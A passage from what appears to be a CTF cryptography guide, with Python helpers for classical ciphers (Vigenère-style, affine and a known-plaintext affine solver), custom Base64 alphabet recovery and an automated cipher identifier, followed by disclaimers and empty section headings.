    
    def vigenere_caesar_hybrid(text, key):
        """Vigenere-style but with Caesar shifts"""
        result = []
        key_index = 0
        
        for char in text:
            if char.isalpha():
                shift = ord(key[key_index % len(key)].upper()) - ord('A')
                if 'a' <= char <= 'z':
                    result.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
                else:
                    result.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
                key_index += 1
            else:
                result.append(char)
        
        return ''.join(result)
    
    def affine_cipher(text, a, b):
        """
        Affine cipher: E(x) = (ax + b) mod 26
        a must be coprime with 26
        """
        import math
        
        if math.gcd(a, 26) != 1:
            return "Invalid 'a' parameter (must be coprime with 26)"
        
        result = []
        for char in text:
            if 'a' <= char <= 'z':
                x = ord(char) - ord('a')
                encrypted = (a * x + b) % 26
                result.append(chr(encrypted + ord('a')))
            elif 'A' <= char <= 'Z':
                x = ord(char) - ord('A')
                encrypted = (a * x + b) % 26
                result.append(chr(encrypted + ord('A')))
            else:
                result.append(char)
        
        return ''.join(result)
    
    def break_affine_cipher(ciphertext, known_plaintext_pairs):
        """
        Break affine cipher with known plaintext
        Need at least 2 character pairs
        """
        if len(known_plaintext_pairs) < 2:
            return None
        
        # Convert to numbers
        p1 = ord(known_plaintext_pairs[0][0].upper()) - ord('A')
        c1 = ord(known_plaintext_pairs[0][1].upper()) - ord('A')
        p2 = ord(known_plaintext_pairs[1][0].upper()) - ord('A')
        c2 = ord(known_plaintext_pairs[1][1].upper()) - ord('A')
        
        # Solve: c1 = a*p1 + b (mod 26)
        #        c2 = a*p2 + b (mod 26)
        # Therefore: c1 - c2 = a*(p1 - p2) (mod 26)
        
        try:
            a = ((c1 - c2) * pow(p1 - p2, -1, 26)) % 26
            b = (c1 - a * p1) % 26
            
            return {'a': a, 'b': b}
        except:
            return None
    
    return {
        'caesar_with_key': caesar_with_key,
        'vigenere_hybrid': vigenere_caesar_hybrid,
        'affine': affine_cipher,
        'break_affine': break_affine_cipher
    }
```

**Modified Base64 Tables**

```python
def detect_custom_base64_table(encoded, known_plain=None):
    """
    Detect and recover custom Base64 alphabet
    """
    standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    if known_plain:
        # Use known plaintext to derive table
        import base64
        standard_encoded = base64.b64encode(known_plain).decode()
        
        # Build character mapping
        custom_table = list(standard_table)
        
        for i, (custom_char, standard_char) in enumerate(zip(encoded, standard_encoded)):
            if custom_char != standard_char:
                # Find positions
                std_pos = standard_table.index(standard_char)
                custom_table[std_pos] = custom_char
        
        return ''.join(custom_table)
    
    # Without known plaintext, look for patterns
    char_freq = {}
    for char in encoded:
        char_freq[char] = char_freq.get(char, 0) + 1
    
    return {
        'note': 'Need known plaintext to fully recover table',
        'character_frequency': sorted(char_freq.items(), key=lambda x: x[1], reverse=True)
    }
```

### CTF Cipher Identification Tool

```python
def identify_cipher(ciphertext):
    """
    Automated cipher identification for CTF challenges
    """
    identifications = []
    
    # Convert to string if bytes
    if isinstance(ciphertext, bytes):
        ct_str = ciphertext.decode('latin-1', errors='ignore')
    else:
        ct_str = ciphertext
    
    # Check Base64
    try:
        import base64
        import re
        if re.match(r'^[A-Za-z0-9+/]+={0,2}$', ct_str.strip()):
            decoded = base64.b64decode(ct_str)
            identifications.append({
                'type': 'Base64',
                'confidence': 'high',
                'decoded_preview': decoded[:50].hex()
            })
    except:
        pass
    
    # Check Hex
    try:
        if all(c in '0123456789abcdefABCDEF ' for c in ct_str):
            decoded = bytes.fromhex(ct_str.replace(' ', ''))
            identifications.append({
                'type': 'Hexadecimal',
                'confidence': 'high',
                'decoded_preview': decoded[:50]
            })
    except:
        pass
    
    # Check Caesar/ROT
    if ct_str.isalpha():
        best_caesar = caesar_bruteforce(ct_str)
        if best_caesar[0]['score'] > 5:
            identifications.append({
                'type': f"Caesar/ROT{best_caesar[0]['shift']}",
                'confidence': 'medium',
                'result': best_caesar[0]['plaintext']
            })
    
    # Check for repeating blocks (ECB)
    if isinstance(ciphertext, bytes) and len(ciphertext) >= 32:
        for block_size in [8, 16]:
            blocks = [ciphertext[i:i+block_size] 
                     for i in range(0, len(ciphertext), block_size)]
            if len(blocks) != len(set(blocks)):
                identifications.append({
                    'type': 'Block cipher (likely ECB mode)',
                    'confidence': 'medium',
                    'block_size': block_size
                })
    
    # Check entropy
    entropy = calculate_entropy(ciphertext if isinstance(ciphertext, bytes) else ct_str.encode())
    if entropy < 4.0:
        identifications.append({
            'type': 'Low entropy (substitution/XOR)',
            'confidence': 'low',
            'entropy': entropy
        })
    elif entropy > 7.5:
        identifications.append({
            'type': 'High entropy (strong cipher or compressed)',
            'confidence': 'low',
            'entropy': entropy
        })
    
    return identifications
```

**Disclaimer:** [Inference] The effectiveness of these techniques depends on specific CTF challenge design. Success rates vary based on implementation details, key parameters, and available information.

[Unverified] Tool commands assume standard installations. Verify tool availability and version compatibility in your environment.

---

# MATHEMATICAL FOUNDATIONS (REFERENCE)



---



---



---

# DOCUMENTATION & REFERENCE



---



---